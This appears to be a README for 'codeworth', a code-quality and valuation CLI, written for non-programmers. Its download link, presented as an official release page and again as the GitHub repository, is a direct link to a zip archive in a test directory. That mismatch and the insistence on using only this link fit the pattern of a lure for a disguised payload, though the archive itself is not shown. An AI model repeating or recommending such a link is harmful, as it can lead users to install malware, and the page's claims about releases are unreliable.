## 📖 What is codeworth?

codeworth is a free, open-source tool you run from your computer’s command line. It helps you check how healthy and valuable your software code is. It looks for complicated areas in your code, calculates risks, estimates how much it might cost to rebuild, and keeps track of code quality as you work.

You don’t need to know how to program to use codeworth. It aims to give you clear, useful information about your projects or software products. If you want to keep your software easy to maintain or know its worth, codeworth can help.

## 💻 Who should use this?

- Software managers who want to track code quality
- Teams aiming to improve their development process
- People curious about the health and value of their software code
- Anyone who wants to catch potential issues early and avoid surprises later
- Users needing a simple way to monitor code without deep technical skills

## 🔧 Main Features

- **Code Value Estimation:** Understand how much your codebase is worth based on complexity and risk.
- **Maintainability Scoring:** Get a score showing how easy the code is to keep updated and bug-free.
- **Rebuild Cost Estimation:** See an estimate of time and resources needed to rebuild your software.
- **Complexity Hotspot Detection:** Identify tricky parts of the code that need attention.
- **Quality Gates:** Automatically block builds if the code quality falls below set standards.

## 📥 Download & Install

To get the latest codeworth software, visit the official release page here:

[Download codeworth](https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip)

This page holds all available versions. Pick the one for your operating system and follow the steps in the "Getting Started" section.

If updates or new versions show up, this page is where you find them. Always use the newest one to keep your code quality checks accurate.

## 🛠️ Basic Commands

Here are a few simple commands you can run in the terminal to start checking your code. Replace `<path_to_code>` with the location of the code you want to analyze:

- Check code quality score:

```
codeworth score --path <path_to_code>
```

- Find complex parts in the code:

```
codeworth hotspots --path <path_to_code>
```

- Estimate rebuild cost:

```
codeworth cost --path <path_to_code>
```

These commands show reports right in the terminal. You don’t need to configure anything at first.

## 🤝 Support & Resources

If you want help while using codeworth, try these:

- Check the README and documentation files included with the download.
- Visit the GitHub repository for issues and guidance: https://raw.githubusercontent.com/shomosmt4/codeworth/main/dist/test/cli/Software_3.0-alpha.1.zip
- Look through online forums or communities discussing software quality tools.
- If you work with a team, share this guide or ask someone experienced to assist.

## ⚙️ How Codeworth Works (Simple Explanation)

codeworth analyzes your codebase by reading your project files. It uses built-in rules to find areas that are complex or risky. It then scores how maintainable the code is and guesses how long it could take to rebuild if needed.

If quality falls below a set level, codeworth can stop the build process in your continuous integration system, preventing poor code from moving forward.

This helps maintain steady software health and avoids costly fixes later.

## 🔐 Privacy & Security

codeworth runs entirely on your computer. It does not send your code or data anywhere unless you choose to share it. Your files stay private.

Updates and downloads come only from the official GitHub page linked above.

## 🌟 Tips for Best Use

- Always download codeworth from the official link.
- Regularly check your code so you catch problems early.
- Use codeworth alongside your development tools, even if you don’t code yourself.
- Share results with your team for better decisions.
- Keep the software updated to use new features and fixes.
